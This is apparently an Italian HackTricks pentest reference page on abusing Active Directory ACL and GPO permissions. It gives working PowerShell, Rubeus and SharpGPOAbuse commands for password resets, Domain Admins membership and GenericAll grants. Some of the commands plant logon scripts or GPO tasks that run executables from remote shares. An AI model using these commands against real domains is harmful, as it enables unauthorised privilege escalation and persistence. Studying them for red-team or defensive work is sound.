# Abusare delle ACL/ACE di Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è principalmente un riepilogo delle tecniche da** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per ulteriori dettagli, controlla gli articoli originali.**

## **Diritti GenericAll su un Utente**

Questo privilegio concede a un attaccante il pieno controllo su un account utente target. Una volta confermati i diritti `GenericAll` utilizzando il comando `Get-ObjectAcl`, un attaccante può:

- **Cambiare la Password del Target**: Utilizzando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
- **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket-granting ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile all'ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Diritti GenericAll sul Gruppo**

Questo privilegio consente a un attaccante di manipolare le appartenenze ai gruppi se ha diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il nome distinto del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al Gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Avere questi privilegi su un oggetto computer o un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: Consente di prendere il controllo di un oggetto computer.
- **Shadow Credentials**: Utilizza questa tecnica per impersonare un computer o un account utente sfruttando i privilegi per creare credenziali shadow.

## **WriteProperty on Group**

Se un utente ha diritti `WriteProperty` su tutti gli oggetti per un gruppo specifico (ad es., `Domain Admins`), può:

- **Aggiungersi al Gruppo Domain Admins**: Realizzabile combinando i comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'escalation dei privilegi all'interno del dominio.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Auto-Membership) su Gruppo**

Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, attraverso comandi che manipolano direttamente l'appartenenza al gruppo. Utilizzando la seguente sequenza di comandi è possibile l'auto-aggiunta:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Auto-Membership)**

Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se hanno il diritto `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Avere il `ExtendedRight` su un utente per `User-Force-Change-Password` consente il ripristino delle password senza conoscere la password attuale. La verifica di questo diritto e il suo sfruttamento possono essere effettuati tramite PowerShell o strumenti da riga di comando alternativi, offrendo diversi metodi per reimpostare la password di un utente, comprese sessioni interattive e one-liner per ambienti non interattivi. I comandi variano da semplici invocazioni di PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner su Gruppo**

Se un attaccante scopre di avere diritti `WriteOwner` su un gruppo, può cambiare la proprietà del gruppo a se stesso. Questo è particolarmente impattante quando il gruppo in questione è `Domain Admins`, poiché cambiare la proprietà consente un controllo più ampio sugli attributi e sui membri del gruppo. Il processo prevede l'identificazione dell'oggetto corretto tramite `Get-ObjectAcl` e poi l'uso di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che per nome.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su Utente**

Questo permesso consente a un attaccante di modificare le proprietà dell'utente. In particolare, con accesso `GenericWrite`, l'attaccante può cambiare il percorso dello script di accesso di un utente per eseguire uno script malevolo al momento dell'accesso dell'utente. Questo viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target per puntare allo script dell'attaccante.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite su Gruppo**

Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo prevede la creazione di un oggetto di credenziali, utilizzandolo per aggiungere o rimuovere utenti da un gruppo e verificando le modifiche all'appartenenza con comandi PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Possedere un oggetto AD e avere privilegi `WriteDACL` su di esso consente a un attaccante di concedere a se stesso privilegi `GenericAll` sull'oggetto. Questo viene realizzato attraverso la manipolazione di ADSI, consentendo il pieno controllo sull'oggetto e la possibilità di modificare le sue appartenenze ai gruppi. Nonostante ciò, esistono limitazioni quando si cerca di sfruttare questi privilegi utilizzando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replica sul Dominio (DCSync)**

L'attacco DCSync sfrutta specifici permessi di replica sul dominio per mimare un Domain Controller e sincronizzare dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)

## Delegazione GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegazione GPO

L'accesso delegato per gestire gli Oggetti di Criterio di Gruppo (GPO) può presentare significativi rischi per la sicurezza. Ad esempio, se un utente come `offense\spotless` ha diritti di gestione GPO delegati, potrebbe avere privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Questi permessi possono essere abusati per scopi malevoli, come identificato utilizzando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerare i Permessi GPO

Per identificare GPO mal configurati, i cmdlet di PowerSploit possono essere concatenati. Questo consente di scoprire i GPO che un utente specifico ha permessi per gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer con una Politica Applicata**: È possibile risolvere quali computer una specifica GPO si applica, aiutando a comprendere l'ambito del potenziale impatto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politiche Applicate a un Dato Computer**: Per vedere quali politiche sono applicate a un particolare computer, possono essere utilizzati comandi come `Get-DomainGPO`.

**OU con una Politica Applicata**: Identificare le unità organizzative (OU) colpite da una data politica può essere fatto utilizzando `Get-DomainOU`.

### Abuso GPO - New-GPOImmediateTask

I GPO mal configurati possono essere sfruttati per eseguire codice, ad esempio, creando un'attività pianificata immediata. Questo può essere fatto per aggiungere un utente al gruppo degli amministratori locali sulle macchine interessate, elevando significativamente i privilegi:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuovi GPO, e la configurazione di preferenze come valori di registro per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente acceda al computer per l'esecuzione:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso di GPO

SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuove GPO. Questo strumento richiede la modifica delle GPO esistenti o l'uso di strumenti RSAT per crearne di nuove prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'aggiornamento della policy

Gli aggiornamenti GPO si verificano tipicamente ogni 90 minuti. Per accelerare questo processo, specialmente dopo aver implementato una modifica, il comando `gpupdate /force` può essere utilizzato sul computer target per forzare un aggiornamento immediato della policy. Questo comando garantisce che eventuali modifiche alle GPO vengano applicate senza attendere il prossimo ciclo di aggiornamento automatico.

### Dietro le quinte

Dopo aver ispezionato i Task Pianificati per una data GPO, come la `Misconfigured Policy`, è possibile confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con l'obiettivo di modificare il comportamento del sistema o di elevare i privilegi.

La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, delinea le specifiche del task pianificato - inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i task pianificati sono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.

### Utenti e Gruppi

Le GPO consentono anche la manipolazione delle appartenenze degli utenti e dei gruppi sui sistemi target. Modificando direttamente i file di policy degli Utenti e dei Gruppi, gli attaccanti possono aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Questo è possibile attraverso la delega dei permessi di gestione delle GPO, che consente la modifica dei file di policy per includere nuovi utenti o cambiare le appartenenze ai gruppi.

Il file di configurazione XML per Utenti e Gruppi delinea come queste modifiche vengono implementate. Aggiungendo voci a questo file, utenti specifici possono essere concessi privilegi elevati sui sistemi interessati. Questo metodo offre un approccio diretto all'elevazione dei privilegi attraverso la manipolazione delle GPO.

Inoltre, possono essere considerate ulteriori metodologie per eseguire codice o mantenere la persistenza, come sfruttare script di accesso/disconnessione, modificare chiavi di registro per autorun, installare software tramite file .msi o modificare configurazioni di servizio. Queste tecniche forniscono vari modi per mantenere l'accesso e controllare i sistemi target attraverso l'abuso delle GPO.

## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
